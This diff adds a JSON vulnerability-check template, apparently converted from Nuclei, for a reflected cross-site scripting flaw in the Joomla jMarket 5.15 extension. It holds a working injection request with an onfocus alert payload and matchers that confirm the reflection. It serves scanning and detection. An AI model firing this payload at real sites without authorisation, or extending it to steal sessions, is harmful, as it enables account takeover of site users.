@@ -1,0 +1,123 @@
+{
+  "id": "joomla-jmarket-xss",
+  "name": "Joomla jMarket 5.15 - Cross-Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim\u0027s session token or login credentials.\n",
+  "references": [
+    "https://packetstormsecurity.com/files/168581/Joomla-jMarket-5.15-Cross-Site-Scripting.html",
+    "https://cxsecurity.com/issue/WLB-2022100002",
+    "https://extensions.joomla.org/"
+  ],
+  "tags": [
+    "packetstorm",
+    "xss",
+    "packetstrom",
+    "joomla",
+    "jmarket"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/index.php?option\u003dcom_jvouchers\u0026controller\u003dcatalog-results\u0026task\u003dquery\u0026wajx\u003d1\u0026wmjx\u003d1\u0026tmpl\u003dcomponent\u0026type\u003draw\u0026crtyid\u003d12\u0026trucs[x][search]\u003dgx3vt%20onfocus\u003dalert(document.domain)%20autofocus\u003d%20itkrzsug7w5",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/html\")",
+            "contains_all(body, \"onfocus\u003dalert(document.domain) autofocus\u003d\", \"catalog-results\", \"joomla\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "joomla-jmarket-xss",
+    "info": {
+      "name": "Joomla jMarket 5.15 - Cross-Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim\u0027s session token or login credentials.\n",
+      "reference": [
+        "https://packetstormsecurity.com/files/168581/Joomla-jMarket-5.15-Cross-Site-Scripting.html",
+        "https://cxsecurity.com/issue/WLB-2022100002",
+        "https://extensions.joomla.org/"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "packetstorm,xss,packetstrom,joomla,jmarket"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/index.php?option\u003dcom_jvouchers\u0026controller\u003dcatalog-results\u0026task\u003dquery\u0026wajx\u003d1\u0026wmjx\u003d1\u0026tmpl\u003dcomponent\u0026type\u003draw\u0026crtyid\u003d12\u0026trucs[x][search]\u003dgx3vt%20onfocus\u003dalert(document.domain)%20autofocus\u003d%20itkrzsug7w5"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/html\")",
+              "contains_all(body, \"onfocus\u003dalert(document.domain) autofocus\u003d\", \"catalog-results\", \"joomla\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
